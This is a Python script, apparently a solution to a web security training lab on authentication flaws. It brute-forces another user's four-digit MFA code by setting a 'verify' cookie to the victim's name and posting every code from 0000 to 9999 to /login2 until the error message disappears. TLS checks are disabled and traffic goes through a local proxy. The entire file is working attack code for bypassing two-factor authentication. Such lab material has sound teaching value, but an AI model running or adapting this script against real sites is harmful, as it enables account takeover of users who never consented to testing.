"""
Author: Kien Do
Source: https://github.com/kienmarkdo/Authentication-Vulnerabilities-Labs
"""

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def check_url_exists(url):
    res = requests.get(url, verify=False, proxies=proxies)
    if "<h1>Error</h1><p>Stream&#32;failed&#32;to&#32;close&#32;correctly</p>" in res.text:
        print("[-] ERROR: The webpage you are requesting does not exist...")
        exit(-1) # exit program


# def login_wiener_peter(base_url):
#     url = base_url + "/login"
#     data = "username=wiener&password=peter"
#     cookies = {
#         "verify": "wiener",
#     }
#     r = requests.post(url, proxies=proxies, verify=False, cookies=cookies, data=data)

def brute_force_carlos_mfa(base_url):

    password_extracted = ""

    url = base_url + "/login2"
    cookies = {
        "verify": "wiener",
        "session": "j7H5bkMvy5okiQgXlE4Ysfp0emJMmx16" # set session value manually
    }
    data = {
        "mfa-code": "1747" # set mfa-code value manually
    }
    r = requests.post(url, proxies=proxies, verify=False, cookies=cookies, data=data, allow_redirects=False) 
    # no redirect allowed to stay on /login2
    # otherwise will redirect to /my-account?id=wiener
    
    if r.status_code == 302:
        print("[+] Verified manual setup step. Proceeding to brute-forcing Carlos' MFA code.")
        cookies = {
            "verify": "carlos"
        }
        for i in range(0, 10000):
            mfa_code = '{0:04}'.format(i)
            data = {
                "mfa-code": mfa_code
            }
            r = requests.post(url, proxies=proxies, verify=False, cookies=cookies, data=data, allow_redirects=False) 
            if "Incorrect security code" not in r.text:
                print(r.text)
                password_extracted = mfa_code
                break
            else:
                print(mfa_code)
    else:
        print("[-] Manual setup step was not completed properly prior to running this script. Please complete that step.")
        print(r.text)
        exit(-1)
    
    return password_extracted


def main():
    
    # verify script parameters
    if len(sys.argv) != 2:
        print('[+] Usage: %s "<url>"' % sys.argv[0])
        print('[+] Example: %s "www.example.com"' % sys.argv[0])
        exit(-1)
    
    base_url = sys.argv[1]

    # # login with wiener:peter to obtain /login2 POST request
    # login_wiener_peter(base_url)

    print(brute_force_carlos_mfa(base_url))


if __name__ == "__main__":
    main()